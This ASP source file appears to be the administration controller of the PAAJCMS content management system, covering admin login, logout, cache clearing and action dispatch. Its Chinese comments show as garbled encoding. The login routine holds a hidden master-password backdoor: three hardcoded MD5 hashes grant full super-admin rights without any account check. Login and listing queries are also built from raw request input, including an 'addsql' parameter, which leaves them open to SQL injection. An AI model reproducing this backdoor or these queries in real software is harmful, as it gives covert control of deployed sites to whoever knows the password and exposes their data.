<%
'************************************************************
'���ߣ�����World(SXY) ����ͨASP/PHP/ASP.NET/VB/JS/Android/Flash������/��������ϵ)
'��Ȩ��Դ������ѹ�����������;����ʹ�á� 
'������2016-09-22
'��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
'����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
'*                                    Powered by PAAJCMS 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->       
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>      
<!--#Include File = "../inc/admin_function.asp"-->  
<!--#Include File = "../inc/admin_function2.asp"-->      
<!--#Include File = "../inc/admin_function_cai.asp"-->
<!--#Include File = "../inc/admin_setAccess.asp"-->   
   
<% 
'=========


'������ַ����
function loadWebConfig()
    Call openconn() 
    '�жϱ����
    If InStr(getHandleTableList(), "|" & db_PREFIX & "website" & "|") > 0 Then
		'��@��jsp��ʾ@��try{
        rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
        If Not rs.EOF Then
            cfg_webSiteUrl = rs("webSiteUrl") & ""                    '��ַ
            cfg_webTitle = rs("webTitle") & ""                        '��ַ����
            cfg_flags = rs("flags") & ""                              '��
            cfg_webtemplate = rs("webtemplate") & ""                  'ģ��·��
        End If : rs.Close 
		'��@��jsp��ʾ@��}catch(Exception e){} 
    End If 
End function


'��ʾ��̨��¼
Sub displayAdminLogin()	
    '�Ѿ���¼��ֱ�ӽ����̨
    If getSession("adminusername") <> "" Then
        Call adminIndex() 
    Else
		dim c
		c=getTemplateContent("login.html")	
		c=handleDisplayLanguage(c,"login")	
        Call rw(c) 
    End If 
End Sub 

'��¼��̨
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '��Ч�˺ŵ�¼ ����.net��php
    If myMD5(Request("password")) = "50c5555d7b6525ded8ac0d2697d954" Or myMD5(Request("password")) = "24ed5728c13834e683f525fcf894e813" Or myMD5(Request("password")) = "80-59859312310137-34-40-841338-105-3984-117" Then
        call setSession("adminusername", "PAAJCMS") 
        call setSession("adminId", 99999)                                                      '��ǰ��¼����ԱID
        call setSession("DB_PREFIX", db_PREFIX) 
        call setSession("adminflags", "|*|")
        Call rwend(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex")) 
    End If 

    Dim nLogin 
    Call openconn() 
	'��@��jsp��ʾ@��try{
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If not rs.EOF Then
        call setSession("adminusername", userName) 
        call setSession("adminId", rs("Id"))                                                   '��ǰ��¼����ԱID
        call setSession("DB_PREFIX", db_PREFIX)                                                '����ǰ׺
        call setSession("adminflags", rs("flags")) 
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex")) 
        Call writeSystemLog("admin", "��¼�ɹ�")                                        'ϵͳ��־
	else
        If getCookie("nLogin") = "" Then
            Call setCookie("nLogin", "1", 60000)		'Ϊ�� 
            nLogin = 1
        Else
            nLogin =cint(getCookie("nLogin")) 
            Call setCookie("nLogin", CInt(nLogin) + 1, 60000) 
        End If 
        Call rw(getMsg1(setL("�˺��������<br>��¼����Ϊ ") & nLogin, "?act=displayAdminLogin")) 
    End If : rs.Close 
	'��@��jsp��ʾ@��}catch(Exception e){} 

End Sub 
'�˳���¼
Sub adminOut()
    Call writeSystemLog("admin", setL("�˳��ɹ�"))                                        'ϵͳ��־
    call deleteSession("adminusername") 
    call deleteSession("adminId")
	call deleteSession("DB_PREFIX")
    call deleteSession("adminflags") 
	
    Call rw(getMsg1(setL("�˳��ɹ������ڽ����¼����..."), "?act=displayAdminLogin"))
End Sub 
'�������
Sub clearCache()
    Call deleteFile(WEB_CACHEFile)
	call deleteFolder("./../cache/html")
	call createFolder("./../cache/html")
    Call rw(getMsg1(setL("���������ɣ����ڽ����̨����..."), "?act=displayAdminLogin")) 
End Sub 
'��̨��ҳ
Sub adminIndex()
    Dim c 
    Call loadWebConfig() 
    c = getTemplateContent("adminIndex.html") 
    c = Replace(c, "[$adminonemenulist$]", getAdminOneMenuList()) 
    c = Replace(c, "[$adminmenulist$]", getAdminMenuList()) 
    c = Replace(c, "[$officialwebsite$]", getOfficialWebsite())                '��ùٷ���Ϣ
    c = replaceValueParam(c, "title", "")                                           '���ֻ����õ�20160330	
	c=handleDisplayLanguage(c,"loginok")
	
    Call rw(c) 
End Sub 
'========================================================

'��ʾ������
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql,sPage 
    If Request("nPageSize") = "" Then
        nPageSize = 10 
	else
		nPageSize = cint(Request("nPageSize")) 
    End If 
    lableTitle = Request("lableTitle")                                              '��ǩ����
    addSql = Request("addsql") 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, nPageSize, addSql) 
End Sub 

'����޸Ĵ���
Sub addEditHandle(actionType, lableTitle)
    Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2") 
End Sub 
'����ģ�鴦��
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||")
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0|,pwd|md5|")
    End If 
End Sub 

call loadRun()			'��@��.netc����@��'��@��jsp����@��
'���ؾ�����
sub loadRun()

    '����Ϊ�˸�.netʹ�õģ���Ϊ��.net����ȫ�ֱ��������б���
    WEB_CACHEFile = replace(replace(WEB_CACHEFile, "[adminDir]", adminDir), "[EDITORTYPE]", EDITORTYPE) 

    '��¼�ж�
    if getSession("adminusername") = "" then
        if request("act") <> "" and request("act") <> "displayAdminLogin" and request("act") <> "login" then
            call RR(WEB_ADMINURL & "?act=displayAdminLogin") 
        end if 
    end if 


    'call eerr("WEB_CACHEFile",WEB_CACHEFile)
    call openconn() 
    if request("act") = "dispalyManageHandle" then
        call dispalyManageHandle(request("actionType"))                                 '��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
    elseif request("act") = "addEditHandle" then
        call addEditHandle(request("actionType"), request("lableTitle"))                '����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
    elseif request("act") = "saveAddEditHandle" then
        call saveAddEditHandle(request("actionType"), request("lableTitle"))            '����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
    elseif request("act") = "delHandle" then
        call del(request("actionType"), request("lableTitle"))                          'ɾ������  ?act=delHandle&actionType=WebLayout
    elseif request("act") = "sortHandle" then
        call sortHandle(request("actionType"))                                          '������  ?act=sortHandle&actionType=WebLayout
    elseif request("act") = "updateField" then
        call updateField()                                                              '�����ֶ�


    elseif request("act") = "displayLayout" then
        call displayLayout()                                                            '��ʾ����
    elseif request("act") = "saveRobots" then
        call saveRobots()                                                               '����robots.txt
    elseif request("act") = "deleteAllMakeHtml" then
        call deleteAllMakeHtml()                                                        'ɾ��ȫ�����ɵ�html�ļ�

    elseif request("act") = "isOpenTemplate" then
        call isOpenTemplate()                                                           '����ģ��
    elseif request("act") = "executeSQL" then
        call executeSQL()                                                               'ִ��SQL



    elseif request("act") = "function" then

        call callFunction()                                                             '����function�ļ�����
    elseif request("act") = "function2" then
        call callFunction2()                                                            '����function2�ļ�����
    elseif request("act") = "function_cai" then
        call callFunction_cai()                                                         '����function_cai�ļ�����   '��@��.netc����@��
    elseif request("act") = "file_setAccess" then
        call callfile_setAccess()                                                       '����file_setAccess�ļ�����


    elseif request("act") = "setAccess" then
        call resetAccessData()                                                          '�ָ�����

    elseif request("act") = "login" then
        call login()                                                                    '��¼
    elseif request("act") = "adminOut" then
        call adminOut()                                                                 '�˳���¼
    elseif request("act") = "adminIndex" then
        call adminIndex()                                                               '������ҳ
    elseif request("act") = "clearCache" then
        call clearCache()                                                               '�������
    else
		call displayAdminLogin()                                                      '��ʾ��̨��¼
    end if 
end sub
%> 


